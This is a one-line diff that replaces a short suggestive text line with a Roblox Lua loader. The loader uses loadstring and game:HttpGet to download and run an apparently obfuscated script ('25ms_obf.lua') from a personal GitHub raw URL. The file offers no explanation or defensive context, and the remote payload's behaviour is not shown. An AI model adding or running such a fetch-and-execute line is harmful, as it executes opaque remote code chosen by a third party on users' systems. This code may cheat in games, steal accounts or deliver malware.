@@ -1,1 +1,1 @@
-ahhhh sexyyyy🤤🫦
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dangnguyenminhienjinmzx/Cbhoc1/refs/heads/main/25ms_obf.lua%20(1).txt"))()
